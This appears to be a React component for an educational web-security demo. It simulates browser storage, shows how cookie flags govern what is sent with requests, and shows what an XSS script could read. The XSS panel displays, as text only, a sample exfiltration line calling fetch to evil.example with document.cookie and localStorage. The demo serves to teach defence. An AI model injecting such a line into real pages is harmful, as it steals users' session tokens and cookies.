import { useState } from 'react';
import { Box, SectionTitle } from '../../components/Panel';
import { Packet, SceneNode } from '../../components/scene';
import { StageFrame } from '../../components/StageFrame';
import { Button, ControlGroup, Legend, Segmented, Stat, Stats, Toggle } from '../../components/ui';
import { useIntroCaption, useSetCaption } from '../../core/caption';
import { bytes, NA } from '../../core/format';
import {
  DRAWERS, REQUESTS, START_STORAGE, byteLength, cookieHeader, rejected, sendsCookie, xssReads,
  type Cookie, type DrawerId, type Request, type SameSite, type Stolen, type Storage, type Tab, type Verdict,
} from './model';
import './styles.css';

const LANE = { w: 480, h: 130, y: 62 };
const BROWSER = { x: 78, y: LANE.y };
const SERVER = { x: 402, y: LANE.y };
const NODE = { w: 136, h: 58 };
const PACKET_MS = 1.2;

interface Sent {
  n: number;
  request: Request;
  header: string;
  /** Each cookie's verdict at the moment it was sent. */
  verdicts: { name: string; verdict: Verdict }[];
  /** The cookies as they were, to notice later flag changes. */
  cookies: Cookie[];
}

export function Stage() {
  const [storage, setStorage] = useState<Storage>(START_STORAGE);
  const [tab, setTab] = useState<Tab>('tab1');
  const [requestId, setRequestId] = useState(REQUESTS[0].id);
  const [editing, setEditing] = useState(0);
  const [sent, setSent] = useState<Sent | null>(null);
  const [totalBytes, setTotalBytes] = useState(0);
  const [stolen, setStolen] = useState<Stolen[] | null>(null);
  const setCaption = useSetCaption();

  const request = REQUESTS.find((r) => r.id === requestId)!;
  const cookies = storage.cookies;
  const c = cookies[editing];
  const shownRequest = sent?.request ?? request;
  const stale = sent !== null && sent.cookies !== cookies;

  useIntroCaption(
    <>A simulated browser for <code>example.com</code> with four places to keep data. Only one of them,{' '}
      <span className="hl">cookies</span>, travels with every request. Press <b>Send request</b>.</>,
  );

  const send = () => {
    const header = cookieHeader(cookies, request);
    const verdicts = cookies.map((ck) => ({ name: ck.name, verdict: sendsCookie(ck, request) }));
    setSent((prev) => ({ n: (prev?.n ?? 0) + 1, request, header, verdicts, cookies }));
    setTotalBytes((t) => t + byteLength(header));
    const count = verdicts.filter((v) => v.verdict.sent).length;
    setCaption(
      count ? (
        <><code>{request.method} {request.host}{request.path}</code> carries a <span className="hl">Cookie</span> header:{' '}
          {count} cookie{count === 1 ? '' : 's'}, {byteLength(header)} bytes. localStorage, sessionStorage and IndexedDB stay home.</>
      ) : (
        <><code>{request.method} {request.host}{request.path}</code> goes out with <span className="hl">no cookies</span>: see why under each one.</>
      ),
    );
  };

  const patchCookie = (patch: Partial<Cookie>) => {
    setStorage((s) => ({ ...s, cookies: s.cookies.map((ck, i) => (i === editing ? { ...ck, ...patch } : ck)) }));
    setStolen(null); // the old XSS result no longer describes these cookies
  };

  const runXss = () => {
    const found = xssReads(storage, tab);
    setStolen(found);
    const readable = found.filter((x) => x.value !== null).length;
    setCaption(
      <>An injected script ran in this tab and read <span className="hl bad">{readable} secrets</span>, including{' '}
        <code>localStorage.authToken</code>. The HttpOnly cookie is the only thing it couldn't see.</>,
    );
  };

  const switchTab = (next: Tab) => {
    setTab(next);
    setStolen(null);
    setCaption(
      next === 'tab2' ? (
        <>A new tab on the same site: cookies, localStorage and IndexedDB are all here, but{' '}
          <span className="hl">sessionStorage is empty</span>, because it belongs to one tab.</>
      ) : (
        <>Back in the first tab: its sessionStorage is still there.</>
      ),
    );
  };

  const drawerItems = (id: DrawerId) => {
    if (id === 'cookies') return cookies.map((ck) => ({ key: ck.name, value: ck.value, secret: ck.httpOnly }));
    if (id === 'session') return storage.session[tab];
    return storage[id];
  };
  const stolenKey = (drawer: DrawerId, key: string) => stolen?.find((s) => s.drawer === drawer && s.key === key);
  const cookiesSent = sent ? sent.verdicts.filter((v) => v.verdict.sent).length : 0;

  return (
    <StageFrame
      height={560}
      stats={
        <Stats>
          <Stat label="Cookies sent" value={sent ? `${cookiesSent} of ${cookies.length}` : NA} color="var(--hi)" />
          <Stat label="Cookie header" value={sent ? `${byteLength(sent.header)} B` : NA} sub="on this request" />
          <Stat label="Sent so far" value={bytes(totalBytes, { base: 1000 })} sub={`over ${sent?.n ?? 0} request${sent?.n === 1 ? '' : 's'}`} />
          <Stat label="XSS could read" value={stolen ? stolen.filter((s) => s.value !== null).length : NA} color={stolen ? 'var(--bad)' : undefined} />
        </Stats>
      }
      legend={
        <Legend
          items={[
            { color: 'var(--info)', label: 'request' },
            { color: 'var(--hi)', label: 'Cookie header' },
            { color: 'var(--bad)', label: 'readable by the attacker script' },
            { color: 'var(--ok)', label: 'protected' },
            { color: 'var(--dim)', label: 'cookie not sent' },
          ]}
        />
      }
      controls={[
        <>
          <Segmented label="Request" value={requestId} onChange={setRequestId} options={REQUESTS.map((r) => ({ value: r.id, label: r.label }))} />
          <Button variant="primary" onClick={send}>Send request</Button>
        </>,
        <ControlGroup key="cookie" label={`Cookie flags: ${c.name}`}>
          <Segmented label="Cookie" value={editing} onChange={setEditing} options={cookies.map((ck, i) => ({ value: i, label: ck.name }))} />
          <Toggle label="HttpOnly" value={c.httpOnly} onChange={(httpOnly) => patchCookie({ httpOnly })} />
          <Toggle label="Secure" value={c.secure} onChange={(secure) => patchCookie({ secure })} />
          <Segmented label="SameSite" value={c.sameSite} onChange={(sameSite: SameSite) => patchCookie({ sameSite })} options={(['Strict', 'Lax', 'None'] as const).map((v) => ({ value: v, label: v }))} />
          <Segmented label="Domain" value={c.domain ?? 'host'} onChange={(d) => patchCookie({ domain: d === 'host' ? null : d })} options={[{ value: 'host', label: 'host-only' }, { value: 'example.com', label: 'example.com' }]} />
          <Segmented label="Path" value={c.path} onChange={(path) => patchCookie({ path })} options={[{ value: '/', label: '/' }, { value: '/api', label: '/api' }]} />
        </ControlGroup>,
        <>
          <Toggle label="Browser tab" value={tab === 'tab2'} onChange={(v) => switchTab(v ? 'tab2' : 'tab1')} off="Tab 1" on="Open a new tab" />
          <Button variant="danger" onClick={runXss}>Run an XSS script</Button>
          <Button onClick={() => { setStorage(START_STORAGE); setSent(null); setTotalBytes(0); setStolen(null); setTab('tab1'); }}>Reset</Button>
        </>,
      ]}
    >
      <div className="stage-pad bst">
        <div className="bst-cabinet">
          {DRAWERS.map((d) => (
            <Box key={d.id} className={`bst-drawer ${d.sentWithRequests ? 'is-sent' : ''}`}>
              <SectionTitle hint={d.api}>{d.name}</SectionTitle>
              <ul className="bst-facts">
                <li>{d.capacity}</li>
                <li>{d.persists}</li>
                <li>{d.holds}</li>
                <li>{d.sentWithRequests ? 'sent with every request' : 'stays in the browser'}</li>
              </ul>
              <div className="bst-items">
                {drawerItems(d.id).length === 0 && <span className="empty-note">(empty in this tab)</span>}
                {drawerItems(d.id).map((it) => {
                  const hit = stolenKey(d.id, it.key);
                  const tone = hit ? (hit.value === null ? 'ok' : 'bad') : '';
                  const cookie = d.id === 'cookies' ? cookies.find((ck) => ck.name === it.key) : undefined;
                  const refused = cookie ? rejected(cookie) : null;
                  return (
                    <code key={it.key} className={`bst-item ${tone ? `tone-${tone} is-marked` : ''} ${refused ? 'is-refused' : ''}`} title={refused || undefined}>
                      {it.key}={it.value}
                      {cookie && <span className="bst-flags">{cookieFlags(cookie)}</span>}
                      {refused && <span className="bst-refused">refused: not stored</span>}
                    </code>
                  );
                })}
              </div>
            </Box>
          ))}
        </div>

        <Box className="bst-lane-box">
          <SectionTitle hint={shownRequest.initiator === 'example.com' ? 'from a page on example.com' : `started by a page on ${shownRequest.initiator}`}>
            The request
          </SectionTitle>
          {/* scrolls sideways on phones rather than shrinking its labels below 8px */}
          <div className="bst-lane-scroll">
            <svg viewBox={`0 0 ${LANE.w} ${LANE.h}`} className="bst-lane" role="img" aria-label="A request travelling from the browser to the server">
              <line className="scene-edge" x1={BROWSER.x + NODE.w / 2} y1={LANE.y} x2={SERVER.x - NODE.w / 2} y2={LANE.y} />
              <SceneNode at={BROWSER} w={NODE.w} h={NODE.h} rx={10} title="Browser" sub={`${shownRequest.initiator} page`} />
              <SceneNode at={SERVER} w={NODE.w} h={NODE.h} rx={10} title="Server" sub={shownRequest.host} />
              {sent && (
                <Packet
                  key={sent.n}
                  path={[{ x: BROWSER.x + NODE.w / 2, y: LANE.y }, { x: SERVER.x - NODE.w / 2, y: LANE.y }]}
                  label={`${sent.request.method} ${sent.request.path}`}
                  color="var(--info)"
                  duration={PACKET_MS}
                />
              )}
            </svg>
          </div>
          <p className="bst-swipe" aria-hidden="true">← swipe the diagram →</p>
          <div className="bst-header">
            <span className="bst-header-name">Cookie:</span>
            {sent && sent.header ? <code className="bst-header-value">{sent.header}</code> : <span className="empty-note">{sent ? '(no Cookie header)' : 'send a request'}</span>}
          </div>
          <ul className="bst-verdicts">
            {sent
              ? sent.verdicts.map(({ name, verdict }) => (
                  <li key={name} className={`log-row ${verdict.sent ? 'tone-hi' : 'tone-dim'}`}>
                    <b>{name}</b>: {verdict.sent ? 'sent' : `not sent (${verdict.reason})`}
                  </li>
                ))
              : cookies.map((ck) => (
                  <li key={ck.name} className="log-row">
                    <b>{ck.name}</b>: {rejected(ck) ?? 'waiting for a request'}
                  </li>
                ))}
          </ul>
          {stale && <p className="bst-stale">You changed a cookie's flags since this request. Send it again to see the effect.</p>}
        </Box>

        {stolen && (
          <Box className="bst-xss">
            <SectionTitle hint="in this tab">The injected script</SectionTitle>
            <code className="bst-script">fetch('https://evil.example/steal', {'{'} body: document.cookie + JSON.stringify(localStorage) {'}'})</code>
            <ul className="bst-verdicts">
              {stolen.map((s) => (
                <li key={`${s.drawer}-${s.key}`} className={`log-row ${s.value === null ? 'tone-ok' : 'tone-bad'}`}>
                  {DRAWERS.find((d) => d.id === s.drawer)!.name} · <b>{s.key}</b>: {s.value === null ? `can't read (${s.protectedBy})` : `stolen: ${s.value}`}
                </li>
              ))}
            </ul>
          </Box>
        )}
        <p className="bst-honest">
          Simulated browser; your real storage is untouched. Capacities are approximate and vary by browser.
        </p>
      </div>
    </StageFrame>
  );
}

function cookieFlags(c: Cookie) {
  const flags = [c.httpOnly && 'HttpOnly', c.secure && 'Secure', `SameSite=${c.sameSite}`, c.domain && `Domain=${c.domain}`, c.path !== '/' && `Path=${c.path}`];
  return ` · ${flags.filter(Boolean).join('; ')}`;
}
